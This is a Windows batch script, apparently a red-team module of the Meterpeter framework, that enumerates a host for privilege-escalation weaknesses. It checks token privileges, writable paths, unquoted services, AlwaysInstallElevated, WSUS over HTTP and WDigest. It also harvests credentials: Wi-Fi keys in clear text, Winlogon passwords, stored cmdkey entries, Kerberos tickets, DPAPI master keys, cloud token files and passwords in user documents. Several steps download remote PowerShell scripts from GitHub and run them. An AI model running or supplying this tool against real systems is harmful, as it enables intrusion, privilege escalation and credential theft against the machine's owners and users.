@echo off
:: Version: v1.3.21
:: Dependencies: icacls\cacls\Get-Acl {native}
:: Author: @r00t-3xp10it (SSA redTeam @2022)
:: Description: Auxiliary module of @Meterpeter v2.10.11 - FindEop module
:: Execution_Note: Execute FindEop.bat verbose - for more elaborated reports. (slower)
:: Methodology: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology
:: ----
TITLE FindEop v1.3.21 {SSA RedTeam @2022}


:: Local variables
SET LocalPath=%cd%
SET BatVersion=v1.3.21
echo Logfile created by @FindEop > %tmp%\ObeeRkiE.log
echo username: @FindEop_Demonstration >> %tmp%\ObeeRkiE.log
echo password: myS3cR3Tp4ss_In_ClearText >> %tmp%\ObeeRkiE.log
:: mode con:cols=130 lines=25
:: Spirit of Heaven, Goddess of Fire and Life!
echo.
echo                                                         \  /
echo                                                         (())
echo                                                         ,~L_
echo                                                        2~~ ^<\
echo                                                        )^>-\y(((GSSsss _%BatVersion%
echo                       __________________________________)v_\__________________________________
echo                      (_// / / / (///////\3__________((_/      _((__________E/\\\\\\\) \ \ \ \\_)
echo                        (_/ / / / (////////////////////(c  (c /^|\\\\\\\\\\\\\\\\\\\\) \ \ \ \_)
echo                         "(_/ / / /(/(/(/(/(/(/(/(/(/(/\_    /\)\)\)\)\)\)\)\)\)\)\ \ \ \_)"
echo                            "(_/ / / / / / / / / / / / /|___/\ \ \ \ \ \ \ \ \ \ \ \ \_)"
echo                               "(_(_(_(_(_(_(_(_(_(_(_(_[_]_|_)_)_)_)_)_)_)_)_)_)_)_)"
echo                                                        ^|    \
echo                                                       / /   /___
echo                                                      / /         '~~~~~__.
echo                                                      \_\_______________\_'_?
echo                                          Spirit of Heaven, Goddess of Fire and Life
echo                                    Methodology: https://shorturl.at/oJRV0 {@swisskyrepo}
echo. && echo. && echo.
:: Banner Timeout
timeout /T 2 >nul


:: List system info
echo SYSTEM INFORMATION
echo ------------------
systeminfo > systeminfo.txt
type systeminfo.txt|findstr "Host OS Registered Owner: Locale:"|findstr /V /C:"Registered Organization:"|findstr /V /C:"BIOS Version:"|findstr /V /C:"OS Build Type:"|findstr /V /C:"Input Locale:"
del /f systeminfo.txt
echo.
echo.

:: List UAC settings
echo USER ACCOUNT CONTROL
echo --------------------                   
powershell -C "$RawPolicyKey = 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system';$UacStatus = (Get-Itemproperty -path $RawPolicyKey).EnableLUA;$ConsentPromptBehaviorUser = (Get-Itemproperty -path $RawPolicyKey).ConsentPromptBehaviorUser;$ConsentPromptBehaviorAdmin = (Get-Itemproperty -path $RawPolicyKey).ConsentPromptBehaviorAdmin;If($UacStatus -eq 0){Write-Host 'UAC Status   :             Disabled' -ForeGroundColor Green -BackGroundColor Black}ElseIf($UacStatus -eq 1){Write-Host 'UAC Status   :             Enabled' -ForeGroundColor Red};If($ConsentPromptBehaviorAdmin -eq 5 -and $ConsentPromptBehaviorUser -eq 3){Write-Host 'UAC Settings :             Notify Me' -ForegroundColor Yellow}ElseIf($ConsentPromptBehaviorAdmin -eq 0 -and $ConsentPromptBehaviorUser -eq 0){Write-Host 'UAC Settings :             Never Notify' -ForeGroundColor Green -BackGroundColor Black}ElseIf($ConsentPromptBehaviorAdmin -eq 2 -and $ConsentPromptBehaviorUser -eq 3){Write-Host 'UAC Settings :             Allways Notify' -ForeGroundColor Red -BackGroundColor Black}"
echo.
echo.

:: List UserPrivs
echo USER INFORMATION
echo ----------------
powershell -C "whoami /user|Format-Table|Out-String -Stream|Select-Object -Skip 4"
echo.
echo.

:: List Local Groups
echo LIST LOCAL GROUPS
echo -----------------
powershell -C "Get-LocalGroup|Select-Object Name,SID,PrincipalSource|Format-table -AutoSize|Out-String -Stream|Select-Object -Skip 1|ForEach-Object {$stringformat = If($_ -iMatch '^(Administra)'){@{ 'ForegroundColor' = 'Yellow' }}Else{@{ 'ForegroundColor' = 'White' }}Write-Host @stringformat $_}"

:: List HotFixes
echo LIST HOTFIXES INSTALLED
echo -----------------------
powershell -C "Get-HotFix|Select-Object Description,HotFixID,InstalledBy,InstalledOn|Format-table -AutoSize|Out-String -Stream|Select-Object -Skip 1|Select-Object -SkipLast 1|ForEach-Object {$stringformat = If($_ -iMatch '^(Security Update)'){@{ 'ForegroundColor' = 'Yellow' }}Else{@{ 'ForegroundColor' = 'White' }}Write-Host @stringformat $_}"
echo.

:: List Privileges
echo PRIVILEGES INFORMATION
echo ----------------------
powershell -C "whoami /priv|Format-Table|Out-String -Stream|Select-Object -Skip 4|ForEach-Object {$stringformat = If($_ -iMatch '(Enabled)'){@{ 'ForegroundColor' = 'Green' }}Else{@{ 'ForegroundColor' = 'White' }}Write-Host @stringformat $_}"
echo.
echo.

:: Abusing the golden privileges
echo JUICY POTATO GOLDEN PRIVILEGES
powershell -C "Write-Host '[i] vulnerable priv if shell is running with low privileges' -ForeGroundColor Yellow"
echo -----------------------------------------------------------
IF %1%.==. (
   powershell -C "$juicy = whoami /priv|findstr /i /C:'SeImpersonatePrivileges' /i /C:'SeAssignPrimaryTokenPrivilege'|findstr /i /C:'Enabled';If(-not($juicy)){write-host '[GOLDEN] None vulnerable token privileges found.'}Else{Write-Host $juicy -ForeGroundColor Green}"
) ELSE (
   :: NOTE: FindEop.bat verbose - triggers more elaborated checks (slower)
   powershell -C "New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT|Out-Null;$CLSID = (Get-ItemProperty HKCR:\clsid\* | Select-Object * | Where-Object {$_.appid -ne $null}).PSChildName|Select -Last 2;ForEach($a in $CLSID){Write-Host "[CLSID]: $a" -ForegroundColor DarkGray};$juicy = whoami /priv|findstr /i /C:'SeImpersonatePrivileges' /i /C:'SeAssignPrimaryTokenPrivilege'|findstr /i /C:'Enabled';If(-not($juicy)){write-host '[GOLDEN] None vulnerable token privileges found.' -ForeGroundColor Red}Else{Write-Host $juicy -ForeGroundColor Green}"
)
echo.
echo.

:: Rotten Potato Silver Privileges
echo ROTTEN POTATO SILVER PRIVILEGES
powershell -C "Write-Host '[i] vulnerable priv if shell is running with low privileges' -ForeGroundColor Yellow"
echo -----------------------------------------------------------
powershell -C "$RottenPotato = whoami /priv|findstr /C:'SeImpersonatePrivilege' /C:'SeAssignPrimaryPrivilege' /C:'SeTcbPrivilege' /C:'SeBackupPrivilege' /C:'SeRestorePrivilege' /C:'SeCreateTokenPrivilege' /C:'SeLoadDriverPrivilege' /C:'SeTakeOwnershipPrivilege' /C:'SeDebugPrivileges'|findstr /C:'Enabled';If(-not($RottenPotato)){write-host '[SILVER] None vulnerable token privileges found.'}Else{Write-Host $RottenPotato -ForeGroundColor Green}"
echo.
echo.

:: Check For Named Pipes
echo CHECK FOR NAMED PIPES
echo ---------------------
:: [System.IO.Directory]::GetFiles("\\.\pipe\")
:: Check for Named Pipes. This can be exploited to obtain the privileges of a process connecting to them.
powershell -C "$CheckPipes = (Get-ChildItem \\.\pipe\ -EA SilentlyContinue).FullName;If($CheckPipes){Write-Host '[VULNERABLE::T1574]' -ForeGroundColor Green -BackGroundColor Black;$Report = $CheckPipes|Select -Skip 1|Select -First 5;echo $Report}Else{Write-Host 'ERROR: None Name Pipes found ..'}"
echo.
echo.

:: Environement Paths
echo ENVIRONEMENT PATHS
echo ------------------
powershell -C "($Env:Path) -Split ';'"
echo.

:: Environement paths entries permissions
echo SCANNING ENVIRONEMENT PATHS PERMISSIONS
powershell -C "Write-Host '[i] Place exe or DLL to exec instead of legitimate' -ForeGroundColor Yellow"
echo --------------------------------------------------
powershell -C "iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/ACLMitreT1574.ps1 -OutFile $Env:TMP\ACLMitreT1574.ps1"
IF %1%.==. (
   powershell -File %tmp%\ACLMitreT1574.ps1 -action path -Egg true
) ELSE (
   :: NOTE: FindEop.bat verbose - triggers more elaborated checks (slower)
   powershell -File %tmp%\ACLMitreT1574.ps1 -action path -extraGroup true -extraperm true -Egg true
)
echo.
echo.

:: User Directorys with fullCONTROL or modify permisions
IF %1%.==. (
   echo DIRECTORYS WITH 'FULLCONTROLL, MODIFY' PERMISSIONS
   powershell -C "Write-Host '[i] Scanning All %%PROGRAMFILES%% directorys recursive ..' -ForeGroundColor Yellow"
   echo ---------------------------------------------------------
   powershell -File %tmp%\ACLMitreT1574.ps1 -action dir -Egg true
) ELSE (
   echo DIRECTORYS WITH 'FULLCONTROLL, MODIFY, WRITE' PERMISSIONS
   powershell -C "Write-Host '[i] Scanning All %%PROGRAMFILES%% directorys recursive ..' -ForeGroundColor Yellow"
   echo ---------------------------------------------------------
   powershell -File %tmp%\ACLMitreT1574.ps1 -action dir -extraGroup true -extraperm true -Egg true
)
echo.
echo.

:: List Unquoted Service Paths
echo SEARCHING FOR UNQUOTED SERVICE PATHS
echo ------------------------------------
powershell -C "iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/Sherlock.ps1 -OutFile $Env:TMP\Sherlock.ps1"
powershell -C "Import-Module -Name $Env:TMP\Sherlock.ps1 -Force;Get-Unquoted SE|Out-String -Stream|Select-Object -Skip 1"
powershell -C "Write-Host '* ElapsedTime:' -ForegroundColor Blue -BackgroundColor Black -NoNewline;Write-Host '00:00:03' -ForegroundColor Green -BackgroundColor Black -NoNewline;Write-Host ' - scantype:' -ForegroundColor Blue -BackgroundColor Black -NoNewline;Write-Host 'Unquoted' -ForegroundColor Green -BackgroundColor Black;"
echo.
echo.

echo WEAK SERVICES REGISTRY PERMISSIONS
echo ----------------------------------
:: (Get-Acl -Path "HKLM:\SYSTEM\CurrentControlSet\services\*" -EA SilentlyContinue).PSPath
powershell -File %tmp%\ACLMitreT1574.ps1 -action reg -Egg true
del /f %tmp%\ACLMitreT1574.ps1
echo.
echo.


:: Define Batch title again because sherlock.ps1 + ACLMitreT1574.ps1 changed it ..
TITLE FindEop %BatVersion% {SSA RedTeam @2022}


:: List Programs that run at startup
echo SEARCHING PROGRAMS THAT RUN AT STARTUP
echo --------------------------------------
powershell -C "Get-CimInstance Win32_StartupCommand|Select-Object Name,Command,Location,User|Format-List|Out-String -Stream|Select-Object -Skip 2|Select-Object -SkipLast 2|ForEach-Object {$stringformat = If($_ -Match '^(Command  :)'){@{ 'ForegroundColor' = 'Green' }}ElseIf($_ -iMatch '^(Location :)'){@{ 'ForegroundColor' = 'Yellow' }}Else{@{ 'ForegroundColor' = 'White' }}Write-Host @stringformat $_}"
echo.

:: List tasks running under system privs
echo TASKS RUNNING UNDER 'SYSTEM' PRIVILEGES
echo ---------------------------------------
powershell -C "tasklist /fi 'username eq system'|Format-Table|Out-String -Stream|Select-Object -Skip 1"
echo.
echo.

:: Link running processes to started services
echo LINK RUNNING PROCESSES TO STARTED SERVICES
echo ------------------------------------------
powershell -C "(tasklist /SVC|Format-Table|Out-String -Stream|Select-Object -Skip 1) -replace '=','-'"
echo.
echo.


:: REGISTRY SEARCH


:: Get Domain Controllers
echo GET DOMAIN CONTROLLERS
echo ----------------------
powershell -C "$DomainControler = $Env:USERDOMAIN;Write-Host DCName::[$DomainControler] 0x995 -ForeGroundColor Yellow;$um = nltest /DCNAME:$DomainControler;$do = nltest /DSGETDC:$DomainControler;$li = nltest /DCLIST:$DomainControler;If($um -ieq $null -or $do -ieq $null -or $li -ieq $null){Write-Host '[MITRE::T1069] fail to found a valid DC name.' -ForeGroundColor Red -BackGroundColor Black}"
echo.
echo.

:: Powershell engine settings
echo DETECTING POWERSHELL ENGINE
echo ---------------------------
powershell -C $PSDefaultVersion = (Get-Host).Version.ToString();write-host "PowershellDefault : $PSDefaultVersion" -ForeGroundColor Yellow
powershell -C "$TESTREGISTRY = reg query 'HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine' /v PowerShellVersion | findstr /C:'2.0';If($TESTREGISTRY){Write-Host 'PowerShellVersion : 2.0 => [VULNERABLE::T1562]' -ForeGroundColor Green -BackGroundColor Black}Else{Write-Host 'ERROR: The system was unable to find the specified registry key or value.'}"
powershell -C "(reg query HKLM\SOFTWARE\Microsoft\PowerShell\3\PowerShellEngine /v PowerShellVersion | findstr /C:'5.') -replace '    PowerShellVersion    REG_SZ   ','PowerShellVersion :'"
powershell -C "(reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging /v EnableModuleLogging | findstr /C:'0x1') -replace '    EnableModuleLogging    REG_DWORD    0x1','EnableModuleLogging : True'"
powershell -C "(reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging /v EnableScriptBlockLogging | findstr /C:'0x1') -replace '    EnableScriptBlockLogging    REG_DWORD    0x1','EnableScriptBlockLogging : True'"
echo.
echo.

:: Is RDP access Enabled?
echo IS RDP ACCESS ENABLED?
echo ----------------------
powershell -C "$TESTREGISTRY = reg query 'HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server' /v fDenyTSConnections | findstr /C:'0x0';If($TESTREGISTRY){Write-Host '[RDP] Connections: Allowed REG_DWORD 0x0 => [VULNERABLE::T1021]' -ForeGroundColor Green -BackGroundColor Black}Else{Write-Host '[RDP] Connections: NotAllowed REG_DWORD 0x1.'}"
echo.
echo.

:: Remote Desktop Credentials Manager
echo REMOTE DESKTOP CREDENTIALS MANAGER
echo ----------------------------------
IF EXIST "%LOCALAPPDATA%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings" (
   echo Exists       : True
   echo Name         : RDCMan.settings
   powershell -C "Write-Host 'Directory    : %%LOCALAPPDATA%%\Microsoft\Remote Desktop Connection Manager' -ForeGroundColor Green"
   powershell -C "Write-Host 'vulnerablity : Credentials are stored inside [ .rdg ] files ..' -ForeGroundColor Yellow"
) ELSE (
   echo [RDP] not found: %%LOCALAPPDATA%%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
)
echo.
echo.

IF NOT %1%.==. (
   :: Cloud Credentials in C:\Users
   echo CLOUD CREDENTIALS in %SYSTEMDRIVE%\Users
   echo -----------------------------
   powershell -C "$TESTFILES = (Get-ChildItem -Path $Env:SYSTEMDRIVE\Users -Recurse -Include 'credentials.db','access_tokens.db','accessTokens.json','azureProfile.json','legacy_credentials','gcloud' -Force -EA SilentlyContinue).FullName;If($TESTFILES){Write-Host $TESTFILES -ForeGroundColor Green -BackGroundColor Black}Else{Write-Host '[CLOUD] not found: credentials in db files.' -ForeGroundColor Red -BackGroundColor Black}"
   echo.
   echo.
)

:: List unattend.xml files
echo LIST UNATTEND.XML FILES EXISTENCE
powershell -C "Write-Host '[i] Creds are stored in base64 and can be decoded manually.' -ForeGroundColor Yellow"
echo ----------------------------------------------------------
powershell -C "findstr /S /I cpassword \\$FQDN\sysvol\$FQDN\policies\*.xml"
powershell -C "$TESTXML = (Get-ChildItem $Env:WINDIR\unattend.xml -EA SilentlyContinue|Select-Object *).FullName;If($TESTXML){Write-Host [XML]:[VULNERABLE::T1552] $TESTXML -ForeGroundColor Green -BackGroundColor Black}Else{Write-Host '[XML] not found: %%WINDIR%%\unattend.xml'}"
powershell -C "$TESTXML = (Get-ChildItem $Env:WINDIR\sysprep\sysprep.xml -EA SilentlyContinue|Select-Object *).FullName;If($TESTXML){Write-Host [XML]:[VULNERABLE::T1552] $TESTXML -ForeGroundColor Green -BackGroundColor Black}Else{Write-Host '[XML] not found: %%WINDIR%%\sysprep\sysprep.xml'}"
powershell -C "$TESTXML = (Get-ChildItem $Env:WINDIR\sysprep\sysprep.inf -EA SilentlyContinue|Select-Object *).FullName;If($TESTXML){Write-Host [XML]:[VULNERABLE::T1552] $TESTXML -ForeGroundColor Green -BackGroundColor Black}Else{Write-Host '[XML] not found: %%WINDIR%%\sysprep\sysprep.inf'}"
powershell -C "$TESTXML = (Get-ChildItem $Env:WINDIR\system32\sysprep.inf -EA SilentlyContinue|Select-Object *).FullName;If($TESTXML){Write-Host [XML]:[VULNERABLE::T1552] $TESTXML -ForeGroundColor Green -BackGroundColor Black}Else{Write-Host '[XML] not found: %%WINDIR%%\system32\sysprep.inf'}"
powershell -C "$TESTXML = (Get-ChildItem $Env:WINDIR\Panther\Unattend.xml -EA SilentlyContinue|Select-Object *).FullName;If($TESTXML){Write-Host [XML]:[VULNERABLE::T1552] $TESTXML -ForeGroundColor Green -BackGroundColor Black}Else{Write-Host '[XML] not found: %%WINDIR%%\Panther\unattend.xml'}"
powershell -C "$TESTXML = (Get-ChildItem $Env:WINDIR\system32\sysprep\sysprep.xml -EA SilentlyContinue|Select-Object *).FullName;If($TESTXML){Write-Host [XML]:[VULNERABLE::T1552] $TESTXML -ForeGroundColor Green -BackGroundColor Black}Else{Write-Host '[XML] not found: %%WINDIR%%\system32\sysprep\sysprep.xml'}"
powershell -C "$TESTXML = (Get-ChildItem $Env:WINDIR\Panther\Unattend\Unattend.xml -EA SilentlyContinue|Select-Object *).FullName;If($TESTXML){Write-Host [XML]:[VULNERABLE::T1552] $TESTXML -ForeGroundColor Green -BackGroundColor Black}Else{Write-Host '[XML] not found: %%WINDIR%%\Panther\unattend\unattend.xml'}"
IF NOT %1%.==. (
   powershell -C "Write-Host '[XML] Searching for extra XML preference files.' -ForeGroundColor Yellow"
   powershell -C "$AllUsers = $Env:ALLUSERSPROFILE;$XMLFiles = (Get-ChildItem -Path $AllUsers -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' -Force -EA SilentlyContinue).FullName;If(-not($XMLFiles)){Write-Host [XML] not found: $AllUsers preference files. -ForeGroundColor Red -BackGroundColor Black}Else{Write-Host '[XML]:[VULNERABLE::T1552]' -ForeGroundColor Green -BackGroundColor Black;Write-Host $FoundXmlFile}"
)
echo.
echo.

:: List AlwaysInstallElevated
echo REGISTRY ALWAYSINSTALLELEVATED
echo ------------------------------
powershell -C "$TESTREGISTRY = Get-ItemPropertyValue -Path 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -EA SilentlyContinue;If($TESTREGISTRY){Write-Host '[HKCU] AlwaysInstallElevated => [VULNERABLE::T1078]' -ForeGroundColor Green -BackGroundColor Black}Else{Write-Host '[HKCU] AlwaysInstallElevated: none vulnerable settings found.'}"
powershell -C "$TESTREGISTRY = Get-ItemPropertyValue -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -EA SilentlyContinue;If($TESTREGISTRY){Write-Host '[HKLM] AlwaysInstallElevated => [VULNERABLE::T1078]' -ForeGroundColor Green -BackGroundColor Black}Else{Write-Host '[HKLM] AlwaysInstallElevated: none vulnerable settings found.'}"
echo.
echo.

:: Inject fake updates into wsus traffic
echo INJECT 'fake' UPDATES INTO NON-SLL WSUS TRAFFIC
echo ------------------------------------------------
powershell -C "$TESTREGISTRY = Get-ItemPropertyValue -Path 'HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate' -Name wuserver -EA SilentlyContinue;If($TESTREGISTRY -iMatch '^(http://)'){Write-Host [WSUS] $TESTREGISTRY => [VULNERABLE::T1012] -ForeGroundColor Green -BackGroundColor Black}Else{Write-Host '[WSUS] wuserver: none vulnerable settings found.'}"
echo.
echo.

:: Registry raw credentials search
echo REGISTRY RAW CREDENTIALS SEARCH
echo -------------------------------
powershell -C "$StdOut = reg query 'HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon'|findstr 'LastUsedUsername DefaultUserName DefaultDomainName DefaultPassword';Write-Host $StdOut -ForeGroundColor Green"
powershell -C "$TESTREGISTRY = Get-Item -Path 'HKLM:\SYSTEM\Current\ControlSet\Services\SNMP' -EA SilentlyContinue;If($TESTREGISTRY){Write-Host '    [SNMP]     found => [VULNERABLE::T1078]' -ForeGroundColor Green -BackGroundColor Black}Else{Write-Host '    [SNMP]     : none vulnerable settings found.'}"
powershell -C "$TESTREGISTRY = Get-Item -Path 'HKCU:\Software\SimonTatham\PuTTY\Sessions' -EA SilentlyContinue;If($TESTREGISTRY){Write-Host '    [PuTTY]    found => [VULNERABLE::T1078]' -ForeGroundColor Green -BackGroundColor Black}Else{Write-Host '    [PuTTY]    : none vulnerable settings found.'}"
powershell -C "$TESTREGISTRY = Get-Item -Path 'HKCU:\Software\ORL\WinVNC3\Password' -EA SilentlyContinue;If($TESTREGISTRY){Write-Host '    [WinVNC3]  found => [VULNERABLE::T1078]' -ForeGroundColor Green -BackGroundColor Black}Else{Write-Host '    [WinVNC3]  : none vulnerable settings found.'}"
powershell -C "$TESTREGISTRY = Get-ItemPropertyValue -Path 'HKLM:\SOFTWARE\RealVNC\WinVNC4' -Name password -EA SilentlyContinue;If($TESTREGISTRY){Write-Host     [WinVNC4]  $TESTREGISTRY => [VULNERABLE::T1012] -ForeGroundColor Green -BackGroundColor Black}Else{Write-Host '    [WinVNC4]  : none vulnerable settings found.'}"
powershell -C "$TESTREGISTRY = Get-Item -Path 'HKCU:\Software\OpenSSH\Agent\Keys' -EA SilentlyContinue;If($TESTREGISTRY){Write-Host '    [OpenSSH]  found => [VULNERABLE::T1078]' -ForeGroundColor Green -BackGroundColor Black}Else{Write-Host '    [OpenSSH]  : none vulnerable settings found.'}"
powershell -C "$TESTREGISTRY = Get-Item -Path 'HKCU:\Software\TightVNC\Server' -EA SilentlyContinue;If($TESTREGISTRY){Write-Host '    [TightVNC] found => [VULNERABLE::T1078]' -ForeGroundColor Green -BackGroundColor Black}Else{Write-Host '    [TightVNC] : none vulnerable settings found.'}"
echo.
echo.

:: LogonCredentialsPlainInMemory
echo LOGON_CREDENTIALS_PLAIN_IN_MEMORY WDIGEST
echo -----------------------------------------
powershell -C "try{$TESTREGISTRY = Get-ItemPropertyValue -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name UseLogonCredential -EA SilentlyContinue;If($TESTREGISTRY){Write-Host [WDIGEST] $TESTREGISTRY => [VULNERABLE::T1012] -ForeGroundColor Green -BackGroundColor Black}Else{Write-Host '[WDIGEST] none vulnerable settings found.'}}catch{Write-Host '[WDIGEST] none vulnerable settings found.'}"
echo.
echo.

:: List Stored cmdkey creds
echo STORED CMDKEY CREDENTIALS (runas)
echo ---------------------------------
powershell -C "cmdkey /list|Format-Table|Out-String -Stream|Select-Object -Skip 3"
echo.

:: Kerberos Tickets
echo KERBEROS TICKETS
echo ----------------
powershell -C "klist|?{$_ -ne ''}|Out-String -Stream|ForEach-Object {$stringformat = If($_ -iMatch '\(0\)'){@{ 'ForegroundColor' = 'Red' }}ElseIf($_ -iMatch '\(\d+\)'){@{ 'ForegroundColor' = 'Green' }}Else{@{ 'ForegroundColor' = 'White' }}Write-Host @stringformat $_}"
powershell -C "$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match 'S-1-5-32-544');If(-not($bool)){Write-Host "[i] Low privileges detected, running on demo mode ..`n" -ForegroundColor red -BackGroundColor Black};iwr -Uri 'https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/GetKerbTix.ps1' -OutFile $Env:TMP\GetKerbTix.ps1|Unblock-File;Import-Module -Name $Env:TMP\GetKerbTix.ps1 -Force|Out-String -Stream|ForEach-Object {$stringformat = If($_ -iMatch '^(klist failed)'){@{ 'ForegroundColor' = 'Red' }}Else{@{ 'ForegroundColor' = 'White' }}Write-Host @stringformat $_}"
del /f %tmp%\GetKerbTix.ps1
echo.

:: DPAPI MASTER KEYS
:: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dpapi-extracting-passwords
echo DPAPI MASTER KEYS
echo -----------------
powershell -C "Get-ChildItem -Path %appdata%\Microsoft\Protect -EA SilentlyContinue|Select-Object Name,LastWriteTime|Format-Table|Out-String -Stream|Select -Skip 1|Select -SkipLast 1"
powershell -C "Write-Host Use Mimikatz 'dpapi::cred' module with /masterkey to decrypt! -ForeGroundColor Yellow"
dir /b /a %appdata%\Microsoft\Credentials\ 2>nul
dir /b /a %localappdata%\Microsoft\Credentials\ 2>nul
echo.
echo.

:: Wifi Credentials
echo SEARCHING STORED WIFI CREDENTIALS
echo ---------------------------------
del /f WifiKeys.log  >nul 2>&1
for /f "tokens=4 delims=: " %%a in ('netsh wlan show profiles ^| find "Profile "') do (netsh wlan show profiles name=%%a key=clear | findstr "SSID Cipher Content" | find /v "Number" >> WifiKeys.log)
powershell -C "(Get-Content WifiKeys.log -Encoding UTF8)|ForEach-Object {$_ -replace '""',''|Out-String -Stream|ForEach-Object {$stringformat = If($_ -iMatch 'Key Content'){@{ 'ForegroundColor' = 'Green' }}Else{@{ 'ForegroundColor' = 'White' }}Write-Host @stringformat $_}}"
del /f WifiKeys.log
echo.
echo.

:: hardcoded credentials in text files
echo HARDCODED CREDENTIALS IN CLEARTEXT?
echo -----------------------------------
dir %userprofile%\Desktop >nul 2>&1
IF %ERRORLEVEL% EQU 0 (
   echo [DIRECTORY] Scanning : '%userprofile%\Desktop'
   cd %userprofile%\Desktop && findstr /s /I /C:"Username:" /s /I /C:"User:" /s /I /C:"user name=" /s /I /C:"pass:" /s /I /C:"Password:" /s /I /C:"Password=" *.txt *.ini >> %tmp%\cleartext.txt
) ELSE (
   echo [DIRECTORY] NotFound : '%userprofile%\Desktop'
)
dir %userprofile%\Documents >nul 2>&1
IF %ERRORLEVEL% EQU 0 (
   echo [DIRECTORY] Scanning : '%userprofile%\Documents'
   cd %userprofile%\Documents && findstr /s /I /C:"Username:" /s /I /C:"User:" /s /I /C:"user name=" /s /I /C:"pass:" /s /I /C:"Password:" /s /I /C:"Password=" *.txt *.log *.xml >> %tmp%\cleartext.txt
) ELSE (
   echo [DIRECTORY] NotFound : '%userprofile%\Documents'
)
dir %tmp% >nul 2>&1
IF %ERRORLEVEL% EQU 0 (
   echo [DIRECTORY] Scanning : '%tmp%'
   cd %tmp% && findstr /s /I /C:"Username:" /s /I /C:"User:" /s /I /C:"user name=" /s /I /C:"pass:" /s /I /C:"passwd:" /s /I /C:"Password:" /s /I /C:"Password=" *.txt *.log *.xml *.ini >> %tmp%\cleartext.txt
) ELSE (
   echo [DIRECTORY] NotFound : '%tmp%'
)
IF EXIST %tmp%\cleartext.txt (
   powershell -C "Get-Content $Env:TMP\cleartext.txt -Encoding UTF8|Out-String -Stream|ForEach-Object {$stringformat = If($_ -iMatch '(User:|Username:|user name=|pass:|passwd:|Password:|Password=)'){@{ 'ForegroundColor' = 'Green' }}Else{@{ 'ForegroundColor' = 'White' }}Write-Host @stringformat $_}"
   :: Clean artifacts left behind
   del /f %tmp%\cleartext.txt
)
:: return to pwd
cd %LocalPath%
echo.


:: FINAL TESTS USING SHERLOCK CMDLET
IF %1%.==. (
   powershell -C "Import-Module -Name $Env:TMP\Sherlock.ps1 -Force;Find-AllVulns"
) ELSE (
   :: NOTE: FindEop.bat verbose - triggers dll-hijacking checks
   powershell -C "Import-Module -Name $Env:TMP\Sherlock.ps1 -Force;Get-DllHijack;Find-AllVulns"
)
del /f %tmp%\Sherlock.ps1


:: Define Batch title again because sherlock.ps1 changed it ..
TITLE FindEop %BatVersion% {SSA RedTeam @2022}

::exit